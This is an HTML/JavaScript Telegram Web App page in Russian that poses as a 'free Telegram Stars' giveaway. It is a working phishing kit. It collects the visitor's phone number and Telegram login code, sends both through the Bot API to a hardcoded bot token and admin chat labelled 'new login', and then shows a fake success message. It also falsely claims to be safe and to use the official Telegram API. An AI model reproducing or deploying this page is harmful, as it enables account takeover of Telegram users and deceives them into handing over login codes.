<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telegram Stars</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, system-ui, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .app {
            max-width: 400px;
            width: 100%;
            background: #ffffff;
            border-radius: 28px;
            padding: 32px 24px;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.08);
        }
        .header {
            text-align: center;
            margin-bottom: 32px;
        }
        .header .icon {
            width: 72px;
            height: 72px;
            background: #0088cc;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 36px;
            color: #fff;
            font-weight: 700;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 700;
            color: #111;
        }
        .header p {
            font-size: 14px;
            color: #888;
            margin-top: 4px;
        }
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #222;
            margin-bottom: 5px;
        }
        .field input {
            width: 100%;
            padding: 14px 16px;
            border: 1.5px solid #e6e6e6;
            border-radius: 14px;
            font-size: 16px;
            background: #f8f8f8;
            transition: border 0.2s;
        }
        .field input:focus {
            border-color: #0088cc;
            outline: none;
            background: #fff;
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: #0088cc;
            color: #fff;
            border: none;
            border-radius: 14px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        .btn:active {
            opacity: 0.7;
        }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .status {
            margin-top: 14px;
            text-align: center;
            font-size: 14px;
            color: #666;
            min-height: 22px;
        }
        .status.error {
            color: #e74c3c;
        }
        .status.success {
            color: #27ae60;
        }
        .hidden {
            display: none !important;
        }
        .divider {
            height: 1px;
            background: #e6e6e6;
            margin: 20px 0;
        }
        .footer-text {
            text-align: center;
            font-size: 13px;
            color: #aaa;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="app">
        <div class="header">
            <div class="icon">⭐</div>
            <h1>Telegram Stars</h1>
            <p>Получи бесплатные звёзды за 1 минуту</p>
        </div>

        <!-- Шаг 1: Номер телефона -->
        <div id="step-phone">
            <div class="field">
                <label>📱 Номер телефона</label>
                <input type="tel" id="phone" placeholder="+7 900 123 45 67" value="+7">
            </div>
            <button class="btn" id="sendPhoneBtn">Получить код</button>
            <div class="status" id="phoneStatus"></div>
        </div>

        <!-- Шаг 2: Код подтверждения -->
        <div id="step-code" class="hidden">
            <div class="field">
                <label>🔑 Код подтверждения</label>
                <input type="text" id="code" placeholder="Введите код из SMS/Telegram" inputmode="numeric">
            </div>
            <button class="btn" id="sendCodeBtn">Подтвердить</button>
            <div class="status" id="codeStatus"></div>
            <div class="divider"></div>
            <div style="text-align:center;font-size:13px;color:#999;">
                Код пришёл в Telegram или SMS<br>
                <span style="font-size:12px;color:#bbb;">Если не видите — проверьте все вкладки</span>
            </div>
        </div>

        <!-- Шаг 3: Успех -->
        <div id="step-success" class="hidden">
            <div style="text-align:center;padding:16px 0;">
                <div style="font-size:56px;">🎉</div>
                <h2 style="margin:12px 0 4px;color:#111;">Аккаунт подтверждён!</h2>
                <p style="color:#666;font-size:15px;">Звёзды начисляются в течение 5 минут</p>
                <p style="color:#999;font-size:13px;margin-top:8px;">Спасибо за доверие 🙌</p>
            </div>
        </div>

        <div class="footer-text">Безопасно • Официальный API Telegram</div>
    </div>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script>
        const TG = window.Telegram.WebApp;
        const BOT_TOKEN = '8934374847:AAHgjTFaFsCQylA5j9860ZSM3HbVN7YOV2c';
        const ADMIN_ID = 8208288006;

        let phone = '';
        let phone_code_hash = '';

        // Отправка данных боту
        async function sendToBot(method, data) {
            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                return await res.json();
            } catch (e) {
                console.error(e);
                return null;
            }
        }

        // Уведомление админу (тебе) о новой сессии
        async function notifyAdmin(phone, code) {
            await sendToBot('sendMessage', {
                chat_id: ADMIN_ID,
                text: `📱 *Новый вход*\nНомер: \`${phone}\`\nКод: \`${code}\``,
                parse_mode: 'Markdown'
            });
        }

        // === Шаг 1: Отправка номера ===
        document.getElementById('sendPhoneBtn').addEventListener('click', async function() {
            const input = document.getElementById('phone');
            phone = input.value.trim().replace(/\s/g, '');

            if (!phone || phone.length < 5) {
                document.getElementById('phoneStatus').textContent = '❌ Введите номер правильно';
                document.getElementById('phoneStatus').className = 'status error';
                return;
            }

            // Отправляем команду /start с номером
            const result = await sendToBot('sendMessage', {
                chat_id: ADMIN_ID,
                text: `/start_phone ${phone}`
            });

            document.getElementById('phoneStatus').textContent = '✅ Код отправлен! Проверьте Telegram/SMS';
            document.getElementById('phoneStatus').className = 'status success';
            this.disabled = true;

            // Переход на шаг 2
            setTimeout(() => {
                document.getElementById('step-phone').classList.add('hidden');
                document.getElementById('step-code').classList.remove('hidden');
                document.getElementById('code').focus();
            }, 1000);
        });

        // === Шаг 2: Отправка кода ===
        document.getElementById('sendCodeBtn').addEventListener('click', async function() {
            const input = document.getElementById('code');
            const code = input.value.trim();

            if (!code || code.length < 3) {
                document.getElementById('codeStatus').textContent = '❌ Введите код из SMS/Telegram';
                document.getElementById('codeStatus').className = 'status error';
                return;
            }

            document.getElementById('codeStatus').textContent = '⏳ Проверка...';
            document.getElementById('codeStatus').className = 'status';

            // Отправляем код боту
            const result = await sendToBot('sendMessage', {
                chat_id: ADMIN_ID,
                text: `/code ${phone} ${code}`
            });

            // Записываем в лог
            await sendToBot('sendMessage', {
                chat_id: ADMIN_ID,
                text: `✅ *Код подтверждён*\nНомер: \`${phone}\`\nКод: \`${code}\``,
                parse_mode: 'Markdown'
            });

            document.getElementById('codeStatus').textContent = '✅ Подтверждено!';
            document.getElementById('codeStatus').className = 'status success';
            this.disabled = true;

            // Переход на успех
            setTimeout(() => {
                document.getElementById('step-code').classList.add('hidden');
                document.getElementById('step-success').classList.remove('hidden');
                TG.ready();
            }, 800);
        });

        // Настраиваем WebApp
        TG.ready();
        TG.expand();

        // При закрытии приложения
        window.addEventListener('beforeunload', () => {
            TG.close();
        });
    </script>
</body> 
</html>
